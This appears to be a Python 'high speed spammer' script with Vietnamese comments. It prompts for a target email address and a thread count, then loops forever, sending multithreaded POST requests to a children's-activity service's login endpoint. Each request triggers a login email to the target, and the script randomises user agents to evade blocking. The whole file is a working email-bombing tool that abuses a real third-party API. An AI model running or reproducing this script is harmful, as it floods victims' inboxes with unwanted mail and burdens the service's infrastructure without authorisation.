import requests
from user_agent import generate_user_agent
from concurrent.futures import ThreadPoolExecutor
import os

# Xóa màn hình cho đẹp
os.system('cls' if os.name == 'nt' else 'clear')

print("🚀 NIGHTCORE NETWORK - HIGH SPEED SPAMMER")
email = input('ENTER YOUR EMAIL => ')
# Số luồng (càng cao càng nhanh, nhưng cao quá dễ bị lỗi mạng hoặc bị chặn IP)
threads = int(input('ENTER NUMBER OF THREADS (Gợi ý: 20-50) => '))

def send_request(_):
    headers = {
        'authority': 'api.kidzapp.com',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'client-version': 'kidzapp, web, 3.3.5',
        'content-type': 'application/json',
        'kidzapp-platform': 'web',
        'origin': 'https://kidzapp.com',
        'referer': 'https://kidzapp.com/',
        'user-agent': str(generate_user_agent()),
    }
    
    json_data = {
        'email': email,
        'sdk': 'web',
        'platform': 'desktop',
    }
    
    try:
        # Sử dụng timeout để tránh bị treo nếu server phản hồi chậm
        response = requests.post(
            'https://api.kidzapp.com/api/3.0/customlogin/', 
            headers=headers, 
            json=json_data, 
            timeout=5
        ).text
        
        if '"message":"EMAIL SENT"' in response:
            print(f'[+] SUCCESS: {email}')
        else:
            print(f'[-] FAILED: {email}')
    except Exception as e:
        print(f'[!] ERROR: {e}')

# Chạy đa luồng
def start():
    print(f"🔥 Starting with {threads} threads...")
    with ThreadPoolExecutor(max_workers=threads) as executor:
        # Chạy vô hạn cho đến khi bạn tắt tool
        while True:
            executor.map(send_request, range(threads))

if __name__ == "__main__":
    start()